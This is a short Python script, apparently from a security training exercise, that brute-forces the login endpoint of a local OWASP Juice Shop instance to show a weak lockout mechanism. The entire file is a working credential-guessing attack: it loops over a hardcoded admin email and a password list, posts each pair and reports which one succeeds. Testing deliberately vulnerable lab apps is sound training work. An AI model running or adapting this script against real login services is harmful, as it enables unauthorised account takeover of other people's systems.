# Brute force attack to denmonstrate weak lockout mechanism

import requests
import time

url = "http://localhost:3000/rest/user/login"

usernames = ["admin@juice-sh.op"]
passwords = ["admin", "password", "123456", "guest123", 
"asdfsdf", "sldfd", "lskdjflkdj", "alsdkfjd", 
"sldkjfds", "salfdjkf", "sdlafhlasd","admin123"]

def attempt_login(username, password):
    payload = {
        "email": username,
        "password": password
    }
    
    try:
        response = requests.post(url, data=payload)

        if response.status_code == 200 and "Invalid credentials" not in response.text:
            print(f"Success: {username} - {password}")
            return True
        else:
            print(f"Failed: {username} - {password}")
            return False
    except requests.RequestException as e:
        print(f"Error: {e}")
        return False

def brute_force():
    print("[*] Starting Brute Force Attack on OWASP Juice Shop Login\n")
    
    for username in usernames:
        for password in passwords:
            print(f"Trying: {username} - {password}")
            success = attempt_login(username, password)
 
            if success:
                break
            time.sleep(1) 


if __name__ == "__main__":
    brute_force()
